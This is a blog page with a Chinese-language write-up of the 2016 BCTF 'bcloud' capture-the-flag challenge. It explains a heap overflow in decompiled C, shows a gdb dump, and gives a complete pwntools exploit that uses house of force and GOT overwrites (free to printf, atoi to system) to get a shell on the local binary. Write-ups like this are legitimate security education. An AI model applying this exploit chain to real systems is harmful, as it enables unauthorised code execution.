@@ -1,0 +1,845 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="ctf,house-of-force," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Challenge好吧，这题不是很难，但是前面没怎么发现该怎么利用。原因是我做题就直奔中心部分，前面的初始化函数往往没怎么认真看。漏洞函数为sub_804884E()，可以造成house of force。我前面刚好记录了house of force的利用过程，思路都差不多，就当是巩固练习吧。其实漏洞都是由下面这个函数造成的：">
+<meta name="keywords" content="ctf,house-of-force">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 BCTF bcloud">
+<meta property="og:url" content="http://yoursite.com/2017/03/18/2016-BCTF-bcloud/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="Challenge好吧，这题不是很难，但是前面没怎么发现该怎么利用。原因是我做题就直奔中心部分，前面的初始化函数往往没怎么认真看。漏洞函数为sub_804884E()，可以造成house of force。我前面刚好记录了house of force的利用过程，思路都差不多，就当是巩固练习吧。其实漏洞都是由下面这个函数造成的：">
+<meta property="og:updated_time" content="2017-11-16T13:43:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016 BCTF bcloud">
+<meta name="twitter:description" content="Challenge好吧，这题不是很难，但是前面没怎么发现该怎么利用。原因是我做题就直奔中心部分，前面的初始化函数往往没怎么认真看。漏洞函数为sub_804884E()，可以造成house of force。我前面刚好记录了house of force的利用过程，思路都差不多，就当是巩固练习吧。其实漏洞都是由下面这个函数造成的：">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/03/18/2016-BCTF-bcloud/"/>
+
+
+  <title> 2016 BCTF bcloud | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2016 BCTF bcloud
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2017-03-18T13:38:12+08:00" content="2017-03-18">
+              2017-03-18
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/ctf-practice/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf_practice</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/03/18/2016-BCTF-bcloud/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2017/03/18/2016-BCTF-bcloud/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>好吧，这题不是很难，但是前面没怎么发现该怎么利用。原因是我做题就直奔中心部分，前面的初始化函数往往没怎么认真看。<br>漏洞函数为sub_804884E()，可以造成house of force。我前面刚好记录了<a href="http://w0lfzhang.me/2016/10/15/house-of-force/" target="_blank" rel="external">house of force</a>的利用过程，思路都差不多，就当是巩固练习吧。<br>其实漏洞都是由下面这个函数造成的：<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">input</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+1Bh] [bp-Dh]@2</span></div><div class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>) &lt;= <span class="number">0</span> )</div><div class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    <span class="keyword">if</span> ( buf == a3 )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *(_BYTE *)(a1 + i) = buf;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> i;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在input name的函数中能泄露heap的地址。然后下面的函数又给house of force“埋下了伏笔”。。。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> org; <span class="comment">// [sp+1Ch] [bp-9Ch]@1</span></div><div class="line">  <span class="keyword">char</span> *org_p; <span class="comment">// [sp+5Ch] [bp-5Ch]@1</span></div><div class="line">  <span class="keyword">int</span> host; <span class="comment">// [sp+60h] [bp-58h]@1</span></div><div class="line">  <span class="keyword">char</span> *host_p; <span class="comment">// [sp+A4h] [bp-14h]@1</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+ACh] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v5 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;org, <span class="number">0</span>, <span class="number">0x90</span>u);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</div><div class="line">  input((<span class="keyword">int</span>)&amp;org, <span class="number">64</span>, <span class="number">10</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</div><div class="line">  input((<span class="keyword">int</span>)&amp;host, <span class="number">64</span>, <span class="number">10</span>);</div><div class="line">  host_p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</div><div class="line">  org_p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);</div><div class="line">  ::org = (<span class="keyword">int</span>)org_p;   <span class="comment">/*op 1*/</span></div><div class="line">  ::host = (<span class="keyword">int</span>)host_p;</div><div class="line">  <span class="built_in">strcpy</span>(host_p, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;host);</div><div class="line">  <span class="built_in">strcpy</span>(org_p, &amp;org);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</div><div class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v5;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>前面四个变量的位置如果不仔细看的话，后面看主体部分的时候真看不出有什么漏洞了。<br>由于缓冲区和两个指针都是相邻的，而后面的赋值操作op 1把缓冲区后面的\x00给覆盖了，所以strcpy(org_p, &amp;org)会顺带把org_p和host缓冲区也给拷贝到堆上了。调试时发现正好可以覆盖到top chunk的size字段。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">gdb-peda$</span> x/72wx 0x084d9000</div><div class="line">0x84d9000:	0x00000000	0x00000049	0x61616161	0x61616161</div><div class="line">0x84d9010:	0x61616161	0x61616161	0x61616161	0x61616161</div><div class="line">0x84d9020:	0x61616161	0x61616161	0x61616161	0x61616161</div><div class="line">0x84d9030:	0x61616161	0x61616161	0x61616161	0x61616161</div><div class="line">0x84d9040:	0x61616161	0x61616161	0x084d9008	0x00000049</div><div class="line">0x84d9050:	0xffffffff	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9060:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9070:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9080:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9090:	0x00000000	0x00000049	0x6f6f6f6f	0x6f6f6f6f</div><div class="line">0x84d90a0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f</div><div class="line">0x84d90b0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f</div><div class="line">0x84d90c0:	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f	0x6f6f6f6f</div><div class="line">0x84d90d0:	0x6f6f6f6f	0x6f6f6f6f	0x084d9098	0xffffffff &lt;---</div><div class="line">0x84d90e0:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d90f0:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9100:	0x00000000	0x00000000	0x00000000	0x00000000</div><div class="line">0x84d9110:	0x00000000	0x00000000	0x00000000	0x00000000</div></pre></td></tr></table></figure></p>
+<p>top chunk的地址为0x84d90d8，可以看到它的size字段已经被覆盖为0xffffffff。而主程序中有malloc(n+4)，这样我们很容易进行house of force攻击。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">1</span></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">  <span class="comment">#context.log_level = "DEBUG"</span></div><div class="line">  p = process(<span class="string">'./bcloud'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">  p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(len, data)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</div><div class="line">  p.sendline(<span class="string">'1'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Input the length of the note content:\n"</span>)</div><div class="line">  r = str(len)</div><div class="line">  p.sendline(r)</div><div class="line">  p.recvuntil(<span class="string">"Input the content:\n"</span>)</div><div class="line">  p.send(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</div><div class="line">  p.sendline(<span class="string">'3'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Input the id:\n"</span>)</div><div class="line">  p.sendline(str(index))</div><div class="line">  p.recvuntil(<span class="string">"Input the new content:\n"</span>)</div><div class="line">  p.send(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></div><div class="line">  p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</div><div class="line">  p.sendline(<span class="string">'4'</span>)</div><div class="line">  p.recvuntil(<span class="string">"Input the id:\n"</span>)</div><div class="line">  p.sendline(str(index))</div><div class="line">  </div><div class="line">p.recvuntil(<span class="string">"Input your name:\n"</span>)</div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">64</span>)</div><div class="line">r = p.recvline()</div><div class="line">heap_addr = u32(r[<span class="number">68</span>:<span class="number">72</span>])</div><div class="line">base_heap = heap_addr - <span class="number">0x8</span></div><div class="line">heap_top = base_heap + <span class="number">0xD8</span> <span class="comment">#216</span></div><div class="line"><span class="keyword">print</span> <span class="string">"base_heap: "</span> + hex(base_heap)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Org:\n"</span>)</div><div class="line">p.send(<span class="string">'o'</span>*<span class="number">64</span>)</div><div class="line">p.recvuntil(<span class="string">"Host:\n"</span>)</div><div class="line">p.sendline(<span class="string">"\xff\xff\xff\xff"</span>)</div><div class="line"><span class="comment">#raw_input("init?go")</span></div><div class="line"></div><div class="line">bss_len_addr = <span class="number">0x0804B0a0</span></div><div class="line">free_got = <span class="number">0x0804B014</span></div><div class="line">printf_plt = <span class="number">0x080484D0</span></div><div class="line">atoi_got = <span class="number">0x0804B03C</span></div><div class="line">read_got = <span class="number">0x0804B00C</span></div><div class="line"></div><div class="line">n = bss_len_addr - <span class="number">8</span> - heap_top - <span class="number">8</span>  <span class="comment">#pre_size + size</span></div><div class="line"><span class="keyword">print</span> <span class="string">"size: "</span> + hex(int(n))</div><div class="line"></div><div class="line">new(n, <span class="string">"\n"</span>)</div><div class="line">new(<span class="number">160</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"\n"</span>)</div><div class="line"><span class="comment">#raw_input()</span></div><div class="line"><span class="comment">#edit(1, 'aaaaaaaa'+"\n")</span></div><div class="line"><span class="comment">#raw_input("go")</span></div><div class="line"></div><div class="line">payload = p32(<span class="number">4</span>)   <span class="comment">#id0's length</span></div><div class="line">payload += p32(<span class="number">4</span>)   <span class="comment">#id1's length</span></div><div class="line">payload += p32(<span class="number">4</span>)   <span class="comment">#id2's length</span></div><div class="line">payload += <span class="string">'a'</span> * <span class="number">0x74</span></div><div class="line">payload += p32(free_got)   <span class="comment">#id0's pointer    change it carefully!!</span></div><div class="line">payload += p32(read_got)   <span class="comment">#id1's pointer</span></div><div class="line">payload += p32(atoi_got)   <span class="comment">#id2's pointer</span></div><div class="line"></div><div class="line">edit(<span class="number">1</span>, payload + <span class="string">"\n"</span>)</div><div class="line">edit( <span class="number">0</span>, p32(printf_plt) )  <span class="comment">#free-got--&gt;printf_plt</span></div><div class="line"></div><div class="line">delete(<span class="number">1</span>)  <span class="comment">#free(id0's pointer)  --&gt;printf(read_got)</span></div><div class="line">read_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"read_addr: "</span> + hex(read_addr)</div><div class="line"><span class="comment">#raw_input("g0")</span></div><div class="line"></div><div class="line">libc_base = read_addr - <span class="number">0xdaf60</span></div><div class="line"><span class="keyword">print</span> <span class="string">"libc_base: "</span> + hex(libc_base)</div><div class="line">system_addr = libc_base + <span class="number">0x40310</span></div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</div><div class="line"></div><div class="line">edit(<span class="number">2</span>, p32(system_addr))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"&gt;&gt;\n"</span>)</div><div class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<p>因为house of force攻击可以控制任何内存区域(用户态可写部分)，所以关键就是控制哪了。开始会想着直接来控制got表，但是一个问题是libc的泄露。show函数没有输出内容，只是输出一句简单的话。所以直接写got表示没用的。<br>我们可以控制bss段的两个数组内存区域，一个为存储长度的数组，另一个为存储堆指针的数组。然后我们结合edit和delete功能泄露libc的地址，并且来写got表。</p>
+<p>我们可以先把id0的堆指针改为free_got的地址，然后edit，将free_got改为print_plt<br>的地址，并且再把其中的一个堆地址改为read_got。然后delete，就相当于printf(read_got)，这样就泄露了libc的地址。然后在以同样方式把atoi_got改为system的地址，这样再选择时输入/bin/sh就能得到shell了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">wolzhang@wolzhang666:~/Desktop$ python bcloud.py </div><div class="line">[+] Starting local process './bcloud': Done</div><div class="line">base_heap: 0x8b43000</div><div class="line">size: -0xaf8048</div><div class="line">read_addr: 0xf763af60</div><div class="line">libc_base: 0xf7560000</div><div class="line">system_addr: 0xf75a0310</div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> id</div><div class="line">uid=1000(wolzhang) gid=1000(wolzhang) groups=1000(wolzhang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag">#ctf</a>
+          
+            <a href="/tags/house-of-force/" rel="tag">#house-of-force</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/17/2016-0CTF-zerostorage/" rel="next" title="2016 0CTF zerostorage">
+                <i class="fa fa-chevron-left"></i> 2016 0CTF zerostorage
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/27/Playing-with-tls-dtor-list/" rel="prev" title="Playing with tls_dtor_list">
+                Playing with tls_dtor_list <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">58</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">93</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2017/03/18/2016-BCTF-bcloud/';
+      var disqus_title = "2016 BCTF bcloud";
+      var disqus_url = 'http://yoursite.com/2017/03/18/2016-BCTF-bcloud/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
